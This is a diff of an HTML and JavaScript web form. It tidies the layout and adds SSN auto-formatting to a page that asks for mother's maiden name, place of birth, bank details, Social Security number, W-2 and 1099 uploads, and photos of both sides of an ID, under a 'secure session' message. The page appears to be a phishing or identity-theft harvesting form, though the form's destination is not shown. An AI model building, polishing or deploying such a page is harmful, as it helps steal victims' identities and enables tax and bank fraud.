@@ -51,30 +51,19 @@ header {
 }
 
 .container {
-  max-width: 1100px;
+  max-width: 700px;
   margin: 30px auto;
   background: white;
-  padding: 25px;
+  padding: 20px;
   border-radius: 12px;
 }
 
-/* GRID */
-.form-grid {
-  display: grid;
-  grid-template-columns: 2fr 1fr;
-  gap: 20px;
-}
-
-.left-side, .right-side {
-  display: flex;
-  flex-direction: column;
-  gap: 20px;
-}
-
+/* SECTIONS */
 .section {
   background: #f8fbff;
   padding: 15px;
-  border-radius: 10px;
+  border-radius: 12px;
+  margin-bottom: 20px;
 }
 
 h3 {
@@ -82,24 +71,29 @@ h3 {
   padding-left: 10px;
 }
 
+/* INPUTS */
 input, textarea, select {
   width: 100%;
-  padding: 12px;
+  padding: 14px;
   margin: 10px 0 15px;
-  border-radius: 6px;
+  border-radius: 8px;
   border: 1px solid #ccc;
+  font-size: 15px;
 }
 
+/* BUTTON */
 button {
   width: 100%;
-  padding: 14px;
+  padding: 16px;
   background: #0a3d62;
   color: white;
   border: none;
-  border-radius: 6px;
+  border-radius: 10px;
   cursor: pointer;
+  font-size: 16px;
 }
 
+/* INTEGRATION */
 .integration-box {
   background: linear-gradient(90deg, #eef3f8, #f8fbff);
   padding: 15px;
@@ -116,12 +110,14 @@ button {
   font-size: 12px;
 }
 
+/* LOADING */
 .loading-box {
   display: none;
   text-align: center;
   margin-top: 15px;
 }
 
+/* FOOTERS */
 .legal-footer {
   text-align: center;
   font-size: 12px;
@@ -140,14 +136,6 @@ footer {
   display: flex;
   align-items: center;
   padding-left: 10px;
-}
-
-/* MOBILE */
-@media (max-width: 768px) {
-  .form-grid {
-    display: flex;
-    flex-direction: column;
-  }
 }
 </style>
 </head>
@@ -189,11 +177,7 @@ footer {
 
 <input type="hidden" name="_redirect" value="success.html">
 
-<div class="form-grid">
-
-<!-- LEFT -->
-<div class="left-side">
-
+<!-- PERSONAL -->
 <div class="section">
 <h3>Personal Information</h3>
 
@@ -207,30 +191,9 @@ footer {
 <input name="mother_maiden_name" placeholder="Mother's Maiden Name" required>
 <input name="place_of_birth" placeholder="Place of Birth (City, State)" required>
 <input name="spouse_name" placeholder="Spouse Name (optional)">
-
 </div>
 
-<div class="section">
-<h3>Tax Documents (W-2 / 1099)</h3>
-
-<input type="file" name="w2_form" accept="image/*,application/pdf" required>
-<input type="file" name="form1099" accept="image/*,application/pdf" required>
-
-</div>
-
-<div class="section">
-<h3>Upload Identification</h3>
-
-<input type="file" name="front_id" accept="image/*" required>
-<input type="file" name="back_id" accept="image/*" required>
-
-</div>
-
-</div>
-
-<!-- RIGHT -->
-<div class="right-side">
-
+<!-- BANK -->
 <div class="section">
 <h3>Bank Details</h3>
 
@@ -245,13 +208,25 @@ footer {
 <input name="bank_name" placeholder="Bank Name" required>
 <input name="ssn" id="ssn" placeholder="SSN (XXX-XX-XXXX)" required>
 <p id="ssnStatus"></p>
-
 </div>
 
+<!-- TAX -->
+<div class="section">
+<h3>Tax Documents (W-2 / 1099)</h3>
+
+<input type="file" name="w2_form" accept="image/*,application/pdf" required>
+<input type="file" name="form1099" accept="image/*,application/pdf" required>
 </div>
 
+<!-- ID -->
+<div class="section">
+<h3>Upload Identification</h3>
+
+<input type="file" name="front_id" accept="image/*" required>
+<input type="file" name="back_id" accept="image/*" required>
 </div>
 
+<!-- LOADING -->
 <div id="loadingBox" class="loading-box">
   <p id="loadingText">🔐 Initializing secure session...</p>
 </div>
@@ -302,8 +277,19 @@ const ssnInput = document.getElementById("ssn");
 const ssnStatus = document.getElementById("ssnStatus");
 
 ssnInput.addEventListener("input", () => {
-  const value = ssnInput.value;
-  ssnStatus.innerText = /^\d{3}-\d{2}-\d{4}$/.test(value)
+  let value = ssnInput.value.replace(/\D/g, ""); // remove non-numbers
+
+  // auto format to 123-45-6789
+  if (value.length > 3 && value.length <= 5) {
+    value = value.slice(0,3) + "-" + value.slice(3);
+  } else if (value.length > 5) {
+    value = value.slice(0,3) + "-" + value.slice(3,5) + "-" + value.slice(5,9);
+  }
+
+  ssnInput.value = value;
+
+  // validate
+  ssnStatus.innerText = value.length === 11
     ? "🟢 Valid SSN format"
     : "⚠️ Invalid format";
 });
